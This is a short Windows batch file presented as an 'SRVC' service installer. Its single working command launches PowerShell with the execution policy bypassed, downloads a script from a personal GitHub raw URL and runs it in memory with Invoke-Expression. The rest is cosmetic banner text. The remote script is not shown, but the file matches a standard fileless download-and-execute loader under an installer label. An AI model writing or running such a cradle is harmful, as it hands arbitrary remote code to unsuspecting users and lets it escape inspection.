@echo off
title SRVC Automated Deployment Agent
echo ====================================================
echo  Starting SRVC Service installer...
echo ====================================================
echo.

:: This launches PowerShell and executes the download/install script directly in memory
powershell -NoProfile -ExecutionPolicy Bypass -Command "[string]$cmd = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/andomatthew1234/service/main/install.ps1'); Invoke-Expression $cmd"

echo.
echo ====================================================
echo  Finished! You can now close this window.
echo ====================================================
pause